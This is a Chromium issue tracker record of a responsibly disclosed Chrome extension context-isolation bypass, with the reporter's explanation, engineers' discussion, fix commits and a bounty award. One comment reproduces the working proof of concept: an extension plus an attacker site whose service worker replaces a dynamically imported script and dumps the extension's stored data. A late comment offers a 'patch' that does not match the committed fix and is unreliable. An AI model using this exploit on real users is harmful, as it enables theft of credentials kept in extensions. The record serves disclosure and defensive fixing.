# Chrome Extension context isolation bypass.

| Field | Value |
|-------|-------|
| **Issue ID** | [371011220](https://issues.chromium.org/issues/371011220) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 129.0.6668.90 |
| **Reporter** | se...@gmail.com |
| **Assignee** | jl...@chromium.org |
| **Created** | 2024-10-02 |
| **Bounty** | $10,000.00 |

## Description

# Steps to reproduce the problem

1. Create folder with extension
2. Copy background.js, content.js, logo.jpg and manifest.json to the extension folder
3. Create assets folder into extension folder and copy example.js there.
4. Extension folder structure should look like at extension\_directory.jpg
5. Go to chrome://extensions/ and upload your extension via "Load unpacked"
6. Click on extension icon to trigger chrome.storage.local.set
7. Upload "index.html" and "service-worker.js" on https host
8. Go to this host
9. You will see extension storage at page content

# Problem Description

In Chromium, the isolation for the import function is implemented incorrectly. An import call from an isolated extension context (content script) goes through site service worker, allowing the script to be replaced in many popular extensions. This enables an attacker to create a website with an exploit and gain access to chrome.storage.local on behalf of the extension.

I have discovered numerous extensions affected by this issue, and they are very popular (1m+ downloads). This behavior is not described in the Chrome documentation and poses a risk to user data (in tested real-world extensions, it was possible to steal user authentication data stored by the extension, as many keep it in storage). In rare cases, it can also lead to UXSS (Universal Cross-Site Scripting) thanks to such extensions.

I believe this behavior is not intuitive and contradicts the logic of context isolation. Therefore, I recommend removing the ability for websites to intercept the import call from an isolated context or explicitly documenting the warning about the dangers of using dynamic module imports in extensions. A PoC is attached.

I am attaching a simple PoC, which consists of a basic extension that exposes chrome.storage.local (and does not use it in any other way).

I am also attaching an example of an attacker's website, which replaces a script dynamically loaded by the extension, allowing the extension's storage to be displayed on the page.

A real-world exploitation example could be more complex and might include sending the storage data to the attacker's website and interacting with chrome.runtime to achieve additional impact by calling the extension’s background.js with unfiltered data.

For your convenience, I am also attaching a "chrome.mov" demonstrating the steps described in the PoC.

# Summary

Chrome Extension context isolation bypass.

# Custom Questions

#### Reporter credit:

Vsevolod Kokorin (Slonser) of Solidlab

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Attachments

- [background.js](attachments/background.js) (text/javascript, 155 B)
- [content.js](attachments/content.js) (text/javascript, 357 B)
- [logo.jpg](attachments/logo.jpg) (image/jpeg, 15.6 KB)
- [manifest.json](attachments/manifest.json) (application/json, 720 B)
- [example.js](attachments/example.js) (text/javascript, 49 B)
- [index.html](attachments/index.html) (text/html, 879 B)
- [service-worker.js](attachments/service-worker.js) (text/javascript, 746 B)
- [extension_directory.jpg](attachments/extension_directory.jpg) (image/jpeg, 21.4 KB)
- [chrome.mov](attachments/chrome.mov) (video/quicktime, 15.4 MB)

## Timeline

### so...@chromium.org (2024-10-02)

Reproduced a few times, but then it stopped reproducing after reloading the webpage of index.html using [shift command r]. Now it only shows {} instead of any set values. Trying to reproduce again. If this is reproducible again, some ideas for mitigation would be to either a) prevent service workers from being able to change the response for a web accessible resource, or b) prevent a changed web accessible resource from running code that has been changed with an event listener response.

### se...@gmail.com (2024-10-02)

Sometimes, you might see something like "I was stealed your storage:{}".
This can occur when the cache and storage are reset.
However, even in this case, a context isolation bypass happens. To understand this, simply enter the extension's context and check that the variable window.slonser is defined there.
Also you can check script content in devtools "content scripts" tab.

### se...@gmail.com (2024-10-02)

When it comes to mitigating this vulnerability, I believe a reasonable solution would be to prevent requests from the isolated context from going through the site's service worker.

For example, this is already implemented for the "fetch" function, which is not handled by the service worker from an isolated context.

In my opinion, a possible good solution could be the addition of a context_id alongside origin when handling scripts.




### se...@gmail.com (2024-10-02)

The problem is indeed significant because I have a list of numerous extensions that, in total, have over 20M+ downloads and are vulnerable to this issue.

I hope for your prompt assistance. If there are any other issues with reproducing the vulnerability, I am always ready to help. It is possible that the PoC I provided is not entirely stable...

### so...@chromium.org (2024-10-02)

The variables are populated again. That said, out of curiosity, where is the following found?

> enter the extension's context and check that the variable window.slonser is defined there

DevTools, and if so, what are the steps to show it?

### so...@chromium.org (2024-10-02)

Edit: I figured it out.

### so...@chromium.org (2024-10-03)

After talking this over with a few folks, it's unclear if this is a security bug or not. On one hand, it is surprising that a web service worker can e.g. run code or access chrome.storage.local.get() for an extension. On the other hand, it only works for web accessible resources, which are intentionally exposed.

> For example, this is already implemented for the "fetch" function, which is not handled by the service worker from an isolated context.

Where is this referenced, to see what has already been done in this regard? This will help to better evaluate what should be done relative to an extension, if anything. Files shared below for quick reproduction for any of the experts that I may have already added.

# Extension

manifest.json

```
{
  "manifest_version": 3,
  "name": "Exploit",
  "version": "1.0",
  "description": "PoC of bypass site isolation",
  "permissions": ["tabs", "cookies", "storage", "scripting"],
  "background": {
    "service_worker": "service_worker.js"
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_end",
      "all_frames": true
    }
  ],
  "web_accessible_resources": [
    {
      "matches": ["http://*/*", "https://*/*"],
      "resources": [
        "replaced.js"
      ]
    }
  ]
}

```

service\_worker.js

```
chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.set({ 'secret': 'secret value' }, () => {
    console.log('Secret set');
  });
});

```

content.js

```
(function () {
  'use strict';

  const injectTime = performance.now();
  (async () => {
    const { onExecute } = await import(
      chrome.runtime.getURL("replaced.js")
    );
    onExecute?.({ perf: { injectTime, loadTime: performance.now() - injectTime } });
  })().catch(console.error);

})();

```

replaced.js

```
function example() {
  console.log("This content will be replaced by the web service worker.");
}

```
# Server

service\_worker.js

```
self.addEventListener("fetch", (event) => {
  console.log(`Handling fetch event for ${event.request.url}!`);
  if (event.request.url.indexOf("chrome-extension") === -1) {
    event.respondWith(fetch(event.request.url));
    return;
  }

  let response = new Response(`(async function foo() {
        window.secret = JSON.stringify(await chrome.storage.local.get());
        console.log(window.secret);
        document.body.innerHTML = 'Stolen storage:' + window.secret;
      })();`, {
    headers: { 'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin': "*" }
  });
  event.respondWith(response);
  return;
});

```

index.html

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Context isolation</title>
</head>

<body>
  <script>
    async function main() {
      if ('serviceWorker' in navigator) {
        var workers = await navigator.serviceWorker.getRegistrations();
        if (workers.length) {
          return;
        }
        navigator.serviceWorker.register('/service_worker.js')
          .then(function (registration) {
            console.log('ServiceWorker registration successful with scope: ', registration.scope);
            document.location = window.location;
          }, function (err) {
            console.log('ServiceWorker registration failed: ', err);
          });
      }
    }
    main();
  </script>
  text
</body>

</html>

```

### se...@gmail.com (2024-10-03)

```
After talking this over with a few folks, it's unclear if this is a security bug or not

```

The problem is that this violates the concept of isolation, and many developers are not aware of this behavior.

One of example: <https://1password.com/> (4m+ downloads)

I have more examples of extensions, but I think it is unethical to list them all here.

In many cases, `chrome.storage.local` contains authorization data, which allows the attacker site to steal the victim's account from the extension. Also in some cases I achieved UXSS via vulnerable extensions.

**If you decide that this is not a Chrome issue, please do not open the ticket for public viewing right away. I will need time to contact the authors of popular extensions that are affected by this problem.**

### so...@chromium.org (2024-10-03)

Some notes [here](https://docs.google.com/document/d/1mKMHEYYnigp2oFOMU4ObLIipMvJj_eMe_2csvoQQHto/edit?usp=sharing).

> For example, this is already implemented for the "fetch" function, which is not handled by the service worker from an isolated context.

Where is this referenced, to see what has already been done in this regard?

> The problem is that this violates the concept of isolation, and many developers are not aware of this behavior.

Can you describe what isolation you specifically have in mind, e.g. world, origin, both, neither, or other?

### so...@chromium.org (2024-10-03)

chrome.storage.session is not available to content scripts, though chrome.storage.local is, according to [this](https://developer.chrome.com/docs/extensions/reference/api/storage). That sounds somewhat intentional. Extensions that wouldn't want to share storage would likely prefer to use chrome.storage.session instead of .local.

### se...@gmail.com (2024-10-03)

```
An isolated world is a private execution environment that isn't accessible to the page or other extensions. A practical consequence of this isolation is that JavaScript variables in an extension's content scripts are not visible to the host page or other extensions' content scripts. The concept was originally introduced with the initial launch of Chrome, providing isolation for browser tabs.

```

I'm, talking about `isolated world`, which used for content scripts according to <https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts>

### se...@gmail.com (2024-10-03)

What you mean by

```
Extensions that wouldn't want to share storage would likely prefer to use chrome.storage.session instead of .local

```

For each extension, chrome.local.storage is unique.

Additionally, the issue is not limited to `chrome.local.storage`; the attacker gains access to `chrome.runtime.sendMessage`

Answer your question about `fetch` isolation:

There is no specific documentation or description for this; it's just how it has already been implemented (you can check this by sending a fetch request from the extension context—it won't go through the service worker).

I will try to figure out how this mechanism is implemented for `fetch` to help you solve the issue.

### so...@chromium.org (2024-10-03)

Agreed that this bug should not be public. This bug should be fixed first. Some notes were shared in [#c10](https://crbug.com/371011220#comment10) that includes different solution options. There were around eight different options listed when that comment was saved. Others have done more digging and Justin offered to investigate this bug even further.

### hc...@google.com (2024-10-03)

Provisionally setting the severity on this to high as per these guidelines (<https://chromium.googlesource.com/chromium/src/+/refs/heads/main/docs/security/severity-guidelines.md#toc-high-severity>) as the summary in the doc:

```
Web service worker is able to replace content of a web accessible resource, thus making the server able to see contents of chrome.storage.local.
This allows for a) remotely hosted code execution in an extension context, and b) web server access to local storage in an extension.

```

sounds like

```
High severity (S1) vulnerabilities allow an attacker to execute code in the context of, or otherwise impersonate other origins or read cross-origin data.

```

Solomon or Justin, lemme know if I'm misinterpreting the impact of this bug and if you think it should be lower (or higher) severity?

### se...@gmail.com (2024-10-04)

If you need help developing mitigation options, I'm always happy to help. (At the very least, I can point out which of the proposed options won't work and why). Unfortunately, I can't read the attached Google Doc. So hopefully when you come up with more meaningful options, you'll share them in a ticket, I'll be happy to help you.

### pe...@google.com (2024-10-04)

Setting milestone because of s0/s1 severity.

### ap...@google.com (2024-10-09)

Project: chromium/src  

Branch: main  

Author: Justin Lulejian <[jlulejian@chromium.org](mailto:jlulejian@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5917013>

[Extensions][ServiceWorker] Skip worker for isolated world module fetch

---


Expand for full commit details
```
[Extensions][ServiceWorker] Skip worker for isolated world module fetch

Before this change, an isolated world (e.g. extension content script,
but also others) could dynamically import a script from an accessible
resource (for extensions this is possible with web accessible
resources and a matching site). When this occurs a web service worker
could intercept that request and respond with arbitrary content.

After this change, isolated world module requests skip triggering the
worker fetch handler. This includes extension content scripts, but also
includes any other scripts that execute in the isolated world context.

Bug: 371011220
Change-Id: I37eda47324b6933a93d2a44792a06ff91399981f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5917013
Auto-Submit: Justin Lulejian <jlulejian@chromium.org>
Reviewed-by: Hiroshige Hayashizaki <hiroshige@chromium.org>
Commit-Queue: Justin Lulejian <jlulejian@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1365918}

```

---

Files:

- M `third_party/blink/renderer/core/loader/modulescript/module_script_loader.cc`

---

Hash: 2c501634c1191be1e509720103f06d51b94e6311  

Date:  Wed Oct 09 00:57:41 2024


---

### jl...@chromium.org (2024-10-09)

First I wanted to say thank you to sevakokorin80@ for reporting this.

A quick recap summary of where this bug is at after some internal discussions and meetings:

- This is confirmed to be a security vulnerability. I was able to repro it on a popular extension in the web store. We couldn't find any potential scenario where a web service worker (external to the extension) should be allowed to execute code in any extension context so this should be disallowed.
- We have a an initial fix as <https://crrev.com/c/5917013>. I believe it reflects the intent of [#comment4](https://issues.chromium.org/issues/371011220#comment4) (could you confirm this sevakokorin80@?).
  - It prevent dynamic imports from going through the web service worker from all isolated contexts. Fetch requests already have this limitation ([here](https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/fetch/fetch_manager.cc;l=1061;drc=e80189412946ddb08c948ff7a40c48273c69b23d), but it is not explicitly documented anywhere yet).
- I'm hoping to merge this to stable by tomorrow.
- There is discussion around script caching that could also affect this, but that was determined to be able to wait for a couple days after the above fix lands.

### jl...@chromium.org (2024-10-09)

Leaving as in progress since there is other work that needs to be investigated, but the security concern should be mitigated by the above commit.

### pe...@google.com (2024-10-09)

This issue appears to be blocking an upcoming release and is therefore an **Urgent Release Blocking Issue** as per <http://go/chrome-slo#release-blocking-issues>. Bumping the priority to P0 to better reflect the urgency.

If this is not a release blocking issue, please adjust the release block field. Adjusting the priority will have no affect, P0 will be re-applied whilever this is marked as a release blocking issue.

### jl...@chromium.org (2024-10-09)

Marked as release blocking 129 (stable) based on [assessing blockers](https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/release_blockers.md#assessing-blockers). I'd say this is a medium-high severity issues that affects at least few/some users.

### se...@gmail.com (2024-10-09)

Thank you for such immersion in the problem and its quick solution. The original PoC is now broken.
Just like you, I was thinking about using caching to exploit this vulnerability.
I think the vectors could be:

1. <link rel="modulepreload"
2. <link rel="preload" as="script"

We can change such requests for caching via service worker.

However, both of these options are impossible to exploit, because the world is taken into account and a reference to the document object and the window is used (which are different for our world)

```
  ResourceLoaderOptions options(document->dom Window()->Get Current World());
  options.initiator_info = initiator_info;
  Fetch Parameters params(std::move(resource_request), options);

  auto* origin = document->domWindow()->GetSecurityOrigin();

```

<https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/html/parser/preload_request.cc;drc=1f03d634907152f74cbbb12bf90be5c08115ca3a;l=139>

Because of these limitations, I was unable to use script cache for exploitation.

### jl...@chromium.org (2024-10-09)

Merge request for fix (5917013) transferred to [crbug.com/372413911](https://crbug.com/372413911).

### pe...@google.com (2024-10-09)

This issue appears to be blocking an upcoming release and is therefore an **Urgent Release Blocking Issue** as per <http://go/chrome-slo#release-blocking-issues>. Bumping the priority to P0 to better reflect the urgency.

If this is not a release blocking issue, please adjust the release block field. Adjusting the priority will have no affect, P0 will be re-applied whilever this is marked as a release blocking issue.

### am...@chromium.org (2024-10-09)

WRT to c#8, this is a high severity issue, but is not a recently introduced security regression from what I can tell nor is it Critical severity issue, so this would not be considered a release blocker for M129 (which has already been shipping to Stable since 17 September nor for 130 shipping next week.

If the release team is already planning to recut 130 Stable RC to accommodate this fix, this can be merge approved in time to do that prior to next week's release.
It cannot be merged approved just yet, since the fix just landed yesterday evening and has not yet had sufficient bake time on canary to ensure there are not stability risks or other issues.

In terms of merge approvals, given the security handling, release, and security advisory and CVE implications to how bugs are handled, I've closed this issue as fixed and merge approvals can be handled on this issue for this fix. I've updated the merge tag, though the bots should generally be left to handled that for security bugs by simply closing the bug as Fixed in the future.

Since there are plans for additional mitigation work to be done, please open a new bug for that instead and this specific bug should be considered resolved and remain closed at this time, since the fix has broken the test case related to this issue.

### jl...@chromium.org (2024-10-09)

Thanks Amy!

So this may go out with M130 if another recut is planned, but if not then this will probably go out with M131.

I've opened <https://issues.chromium.org/u/1/issues/372512079> to follow-up in investigating whether caching could also affect this.

### am...@chromium.org (2024-10-10)

re c#27, there are Chrome Stable channel updates weekly so if M130 Stable milestone release isn't recut before release next week after this is merged, this will go out in the first respin of M130 which is the following week -- 22 October

### am...@chromium.org (2024-10-11)

reviewed Canary data and there are not any issues apparent related to this fix
<https://crrev.com/c/5917013> approved for merge to M130; please merge this fix to branch 6723 at your earliest convenience so this fix can be included in the first respin of M130 Stable

### se...@gmail.com (2024-10-14)

Hello, I found issue that related to this issue
<https://issues.chromium.org/issues/373263969>.

### pe...@google.com (2024-10-15)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### ap...@google.com (2024-10-18)

Project: chromium/src  

Branch: refs/branch-heads/6723  

Author: Justin Lulejian <[jlulejian@chromium.org](mailto:jlulejian@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5940150>

[M130][Extensions][ServiceWorker] Skip worker for isolated world module fetch

---


Expand for full commit details
```
[M130][Extensions][ServiceWorker] Skip worker for isolated world module fetch

Before this change, an isolated world (e.g. extension content script,
but also others) could dynamically import a script from an accessible
resource (for extensions this is possible with web accessible
resources and a matching site). When this occurs a web service worker
could intercept that request and respond with arbitrary content.

After this change, isolated world module requests skip triggering the
worker fetch handler. This includes extension content scripts, but also
includes any other scripts that execute in the isolated world context.

(cherry picked from commit 2c501634c1191be1e509720103f06d51b94e6311)

Bug: 371011220
Change-Id: I37eda47324b6933a93d2a44792a06ff91399981f
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5917013
Auto-Submit: Justin Lulejian <jlulejian@chromium.org>
Reviewed-by: Hiroshige Hayashizaki <hiroshige@chromium.org>
Commit-Queue: Justin Lulejian <jlulejian@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1365918}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5940150
Owners-Override: Daniel Yip <danielyip@google.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/6723@{#1432}
Cr-Branched-From: 985f2961df230630f9cbd75bd6fe463009855a11-refs/heads/main@{#1356013}

```

---

Files:

- M `third_party/blink/renderer/core/loader/modulescript/module_script_loader.cc`

---

Hash: 8c4edae5e34dbe82ebaaf9596710800ac524258a  

Date:  Fri Oct 18 21:34:12 2024


---

### pe...@google.com (2024-10-18)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### jl...@chromium.org (2024-10-22)

RE [#comment33](https://issues.chromium.org/issues/371011220#comment33):

1. Was this issue a regression for the milestone it was found in?
   
   No, this was a pre-existing issues most likely present for several past milestones.
2. Is this issue related to a change or feature merged after the latest LTS Milestone?
   
   No, this was a pre-existing issues most likely present for several past milestones.

### sp...@google.com (2024-10-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
report of high quality, moderate impact user information web platform privilege escalation with information disclosure


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-10-22)

Congratulations Vsevolod! Thank you for your efforts and reporting this issue to us -- great work!

### pe...@google.com (2024-10-29)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### rz...@google.com (2024-10-29)

1. <https://crrev.com/c/5962436>
2. Low, no conflicts
3. 130
4. Yes

### ap...@google.com (2024-11-07)

Project: chromium/src  

Branch: refs/branch-heads/6478  

Author: Justin Lulejian <[jlulejian@chromium.org](mailto:jlulejian@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/5962436>

[M126-LTS][Extensions][ServiceWorker] Skip worker for isolated world module fetch

---


Expand for full commit details
```
[M126-LTS][Extensions][ServiceWorker] Skip worker for isolated world module fetch 
 
Before this change, an isolated world (e.g. extension content script, 
but also others) could dynamically import a script from an accessible 
resource (for extensions this is possible with web accessible 
resources and a matching site). When this occurs a web service worker 
could intercept that request and respond with arbitrary content. 
 
After this change, isolated world module requests skip triggering the 
worker fetch handler. This includes extension content scripts, but also 
includes any other scripts that execute in the isolated world context. 
 
(cherry picked from commit 2c501634c1191be1e509720103f06d51b94e6311) 
 
Bug: 371011220 
Change-Id: I37eda47324b6933a93d2a44792a06ff91399981f 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5917013 
Auto-Submit: Justin Lulejian <jlulejian@chromium.org> 
Commit-Queue: Justin Lulejian <jlulejian@chromium.org> 
Cr-Original-Commit-Position: refs/heads/main@{#1365918} 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5962436 
Commit-Queue: Dan Clark <daniec@microsoft.com> 
Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com> 
Reviewed-by: Dan Clark <daniec@microsoft.com> 
Reviewed-by: Justin Lulejian <jlulejian@chromium.org> 
Reviewed-by: Mohamed Omar <mohamedaomar@google.com> 
Owners-Override: Mohamed Omar <mohamedaomar@google.com> 
Cr-Commit-Position: refs/branch-heads/6478@{#1991} 
Cr-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}

```

---

Files:

- M `third_party/blink/renderer/core/loader/modulescript/module_script_loader.cc`

---

Hash: 2a3c93ea91af09107b776d91d2bd2d6bedf88d76  

Date:  Thu Nov 07 00:39:18 2024


---

### ap...@google.com (2024-11-11)

Project: chromium/src  

Branch: refs/branch-heads/6478\_182  

Author: Justin Lulejian <[jlulejian@chromium.org](mailto:jlulejian@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6011313>

[CfM-R126][Extensions][ServiceWorker] Skip worker for isolated world module fetch

---


Expand for full commit details
```
[CfM-R126][Extensions][ServiceWorker] Skip worker for isolated world module fetch 
 
Before this change, an isolated world (e.g. extension content script, 
but also others) could dynamically import a script from an accessible 
resource (for extensions this is possible with web accessible 
resources and a matching site). When this occurs a web service worker 
could intercept that request and respond with arbitrary content. 
 
After this change, isolated world module requests skip triggering the 
worker fetch handler. This includes extension content scripts, but also 
includes any other scripts that execute in the isolated world context. 
 
(cherry picked from commit 2c501634c1191be1e509720103f06d51b94e6311) 
 
(cherry picked from commit 2a3c93ea91af09107b776d91d2bd2d6bedf88d76) 
 
Bug: 371011220 
Change-Id: I37eda47324b6933a93d2a44792a06ff91399981f 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5917013 
Auto-Submit: Justin Lulejian <jlulejian@chromium.org> 
Commit-Queue: Justin Lulejian <jlulejian@chromium.org> 
Cr-Original-Original-Commit-Position: refs/heads/main@{#1365918} 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5962436 
Commit-Queue: Dan Clark <daniec@microsoft.com> 
Auto-Submit: Roger Felipe Zanoni da Silva (xWF) <rzanoni@google.com> 
Reviewed-by: Dan Clark <daniec@microsoft.com> 
Reviewed-by: Justin Lulejian <jlulejian@chromium.org> 
Reviewed-by: Mohamed Omar <mohamedaomar@google.com> 
Owners-Override: Mohamed Omar <mohamedaomar@google.com> 
Cr-Original-Commit-Position: refs/branch-heads/6478@{#1991} 
Cr-Original-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313} 
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/6011313 
Auto-Submit: Kyle Williams <kdgwill@chromium.org> 
Owners-Override: Kyle Williams <kdgwill@chromium.org> 
Reviewed-by: Niko Tsirakis <ntsirakis@google.com> 
Commit-Queue: Kyle Williams <kdgwill@chromium.org> 
Cr-Commit-Position: refs/branch-heads/6478_182@{#101} 
Cr-Branched-From: 5b5d8292ddf182f8b2096fa665b473b6317906d5-refs/branch-heads/6478@{#1776} 
Cr-Branched-From: e6143acc03189c5e52959545b110d6d17ecd5286-refs/heads/main@{#1300313}

```

---

Files:

- M `third_party/blink/renderer/core/loader/modulescript/module_script_loader.cc`

---

Hash: 593aca8d25857a3547b2695740b0caee095c25b8  

Date:  Mon Nov 11 18:58:31 2024


---

### se...@gmail.com (2024-12-18)

Hi! I wanted to ask for your permission to disclose this bug early. The thing is, I’d like to include this vulnerability in my article about Chrome extension security, which I plan to publish by the end of this year. However, the timeline for this bug to become publicly visible is only in January. (I’m not very keen on waiting until January because I was planning to give a small gift to the community for New Year’s with an in-depth dive into Chrome extension security.)

I understand that this is probably not possible, but I decided to ask for your permission just in case you agree.

### am...@chromium.org (2024-12-19)

Thanks for reaching out and checking. While I understand and appreciate the desire here and we sometimes make exceptions for early disclosure, it's difficult to warrant granting early disclosure for high severity bugs. We similarly would like to give a gift to the user community -- maximum opportunity to update their browsers to a version with this fix. This fix shipped in an update in the prior milestone (130) and given recent release freezes, some users and enterprises may not be fully caught up, unfortunately.
We hope that you can understand and can understand why we request you observe the standard disclosure date.

### pe...@google.com (2025-01-16)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### vo...@gmail.com (2026-02-25)

/\*\*

- Patch for [Issue 371011220](https://issues.chromium.org/issues/371011220): Chrome Extension Context Isolation Bypass
- Target: Chromium Extension Module Loader / Service Worker Interception
- - Description: Prevents dynamic imports from isolated content script contexts
- from being intercepted by a site's Service Worker FetchEvent, ensuring
- extensions cannot have their logic replaced by malicious web hosts.
  \*/

// Implementation to be applied in: //extensions/renderer/extension\_injection\_host.cc
// and //content/browser/service\_worker/service\_worker\_controllee\_requester.cc

/\*
// Logical Fix: Ensure that requests originating from an isolated world (content script)
// are marked as 'skip\_service\_worker' when the request URL belongs to the extension
// origin (chrome-extension://).
\*/

void OnResourceRequest(network::ResourceRequest\* request) {
if (request->isolated\_world\_id != 0 &&
request->url.SchemeIs("chrome-extension")) {
// Force bypass of the Service Worker to maintain context isolation.
request->skip\_service\_worker = true;
request->trusted\_params = network::ResourceRequest::TrustedParams();
}
}

/\*
// Mitigation for existing extensions:
// Explicitly block cross-origin module scripts from being loaded into
// the extension's execution context unless declared in web\_accessible\_resources.
\*/

bool IsAllowedChildFrameNavigation(const GURL& url, const Extension\* extension) {
if (extension && url.SchemeIs(extensions::kExtensionScheme)) {
if (url.host() != extension->id()) {
return false; // Prevent cross-extension/site-to-extension dynamic import hijacking
}
}
return true;
}

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/371011220)*
